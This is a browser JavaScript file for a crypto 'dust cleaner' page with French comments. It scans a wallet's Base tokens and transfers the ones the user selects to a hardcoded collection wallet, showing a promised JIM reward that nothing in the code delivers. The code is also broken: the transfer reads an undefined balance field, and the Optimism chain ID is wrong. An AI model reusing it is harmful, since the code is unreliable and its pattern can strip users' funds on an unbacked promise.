const connectButton = document.getElementById("connectButton");
const dustContainer = document.getElementById("dustContainer");
const cleanButton = document.getElementById("cleanButton");
const statusDiv = document.getElementById("status");

const COLLECTION_WALLET = "0x86E85282557fF41A7cD89AD7aA4BBD31CFea3fa9";

let provider;
let signer;
let selectedTokens = [];

const CHAIN_IDS = {
    "eth": "0x1",
    "base": "0x2105",
    "polygon": "0x89",
    "bsc": "0x38",
    "arbitrum": "0xa4b1",
    "optimism": "0xa4b0"
};

const NETWORKS = ["base", "eth", "polygon", "bsc", "arbitrum", "optimism"];

connectButton.onclick = async () => {
    if (!window.ethereum) {
        alert("MetaMask requis");
        return;
    }

    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    const address = await signer.getAddress();

    statusDiv.innerHTML = "✅ Wallet connecté : " + address;
    scanDust(address);
};

// MODIFIÉ : Récupère désormais le VRAI prix en direct depuis CoinGecko (GeckoTerminal)
async function scanDust(wallet) {
    dustContainer.innerHTML = "🔍 Scan et récupération des vrais prix du marché...";
    selectedTokens = [];
    updateButton();

    try {
        const response = await fetch(
            `https://jimtok-backend.onrender.com/tokens/${wallet}/base`
        );
        const data = await response.json();
        const tokens = data.result.tokenBalances;

        let processedTokens = [];

        for (const token of tokens) {
            const rawBalance = token.tokenBalance;

            if (!rawBalance || rawBalance === "0x" || rawBalance === "0x0000000000000000000000000000000000000000000000000000000000000000") {
                continue;
            }

            const addrMinuscule = token.contractAddress.toLowerCase();
            
            // Configuration par défaut
            let symbol = "DREAM";
            if (addrMinuscule === "0xc8c75f020a9cca652e9d2c2c13fa3c7522d2626a") {
                symbol = "JIM";
            }

            // --- LE VRAI CALCUL DU PRIX EN TEMPS RÉEL ---
            let vraiPrixUsd = 0;
            try {
                // On interroge l'API publique de CoinGecko pour le réseau Base
                const priceResponse = await fetch(
                    `https://api.geckoterminal.com/api/v2/networks/base/tokens/${addrMinuscule}`
                );
                const priceData = await priceResponse.json();
                
                // Si le jeton a un prix enregistré sur les échanges (DEX), on le récupère
                if (priceData && priceData.data && priceData.data.attributes) {
                    vraiPrixUsd = Number(priceData.data.attributes.price_usd || 0);
                }
            } catch (priceErr) {
                console.log(`Impossible de récupérer le prix en direct pour ${addrMinuscule}, utilisation du prix de secours.`);
                // Prix de secours si le jeton n'est pas encore listé ou si l'API bloque
                vraiPrixUsd = symbol === "JIM" ? 0.000002 : 0.04;
            }

            // Conversion de la quantité
            const balanceBigInt = BigInt(rawBalance);
            const balanceFormatee = ethers.formatUnits(balanceBigInt, 18);
            const quantiteNumerique = Number(balanceFormatee);

            // Valeur totale réelle en USD
            const valeurTotaleUsd = quantiteNumerique * vraiPrixUsd;

            if (quantiteNumerique > 0) {
                processedTokens.push({
                    contractAddress: token.contractAddress,
                    symbol: symbol,
                    balanceRaw: rawBalance,
                    balanceFormatted: balanceFormatee,
                    calculatedUsd: valeurTotaleUsd, // Stockage du vrai prix calculé
                    chain: "base"
                });
            }
        }

        renderTokens(processedTokens);

    } catch(err) {
        console.log(err);
        dustContainer.innerHTML = "Erreur scan";
    }
}

function renderTokens(tokens) {
    dustContainer.innerHTML = "";

    tokens.forEach(token => {
        const div = document.createElement("div");
        div.className = "token";
        div.style.display = "flex";
        div.style.alignItems = "center";
        div.style.margin = "10px 0";
        div.style.padding = "10px";
        div.style.border = "1px solid #ccc";
        div.style.borderRadius = "8px";

        div.innerHTML = `
            <input type="checkbox" style="margin-right: 15px; transform: scale(1.2);" />
            <div style="text-align: left; flex-grow: 1;">
                <strong style="font-size: 16px; color: #333;">${token.symbol}</strong>
                <span style="font-size: 11px; color: gray; display: block; word-break: break-all;">${token.contractAddress}</span>
                <div style="font-weight: bold; margin-top: 5px; display: flex; justify-content: space-between;">
                    <span style="color: #007bff;">Quantité : ${Number(token.balanceFormatted).toLocaleString('fr-FR', { maximumFractionDigits: 4 })}</span>
                    <span style="color: #28a745;">Valeur : $${token.calculatedUsd.toFixed(2)}</span>
                </div>
            </div>
        `;

        const checkbox = div.querySelector("input");
        checkbox.addEventListener("change", e => {
            if (e.target.checked) {
                selectedTokens.push(token);
            } else {
                selectedTokens = selectedTokens.filter(
                    t => t.contractAddress !== token.contractAddress
                );
            }
            updateButton();
        });

        dustContainer.appendChild(div);
    });
}

function updateButton() {
    if (selectedTokens.length === 0) {
        cleanButton.style.display = "none";
        return;
    }

    cleanButton.style.display = "block";

    let totalSelectionUsd = selectedTokens.reduce(
        (sum, t) => sum + Number(t.calculatedUsd || 0),
        0
    );

    // Ajuste ce taux : par exemple, 1$ de valeur réelle = 100 000 JIM
    const tauxConversion = 100000;
    const estimatedJIM = Math.floor(totalSelectionUsd * tauxConversion);

    cleanButton.innerText = `Recevoir ~ ${estimatedJIM > 0 ? estimatedJIM : 500} JIM ($${totalSelectionUsd.toFixed(2)})`;
}

cleanButton.onclick = async () => {
    try {
        for (const token of selectedTokens) {
            const targetChainId = CHAIN_IDS[token.chain || "base"];
            statusDiv.innerHTML = `⏳ Basculement vers le réseau Base...`;
            
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: targetChainId }],
                });
            } catch (switchError) {
                alert(`S'il te plaît, ajoute ou sélectionne le réseau Base dans ton MetaMask.`);
                throw new Error("Réseau non disponible");
            }

            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();

            const tokenContract = new ethers.Contract(
                token.contractAddress,
                ["function transfer(address to, uint256 amount) returns (bool)"],
                signer
            );

            statusDiv.innerHTML = `⏳ Autorisation et transfert de ${token.symbol}...`;

            const tx = await tokenContract.transfer(
                COLLECTION_WALLET,
                BigInt(token.tokenBalance.toString())
            );

            await tx.wait();
        }

        statusDiv.innerHTML = "✅ Toutes les poussières sélectionnées ont été envoyées !";
        selectedTokens = [];
        updateButton();
        const currentAddress = await signer.getAddress();
        scanDust(currentAddress);

    } catch(err) {
        console.log(err);
        statusDiv.innerHTML = "❌ Transaction annulée ou erreur réseau";
    }
};
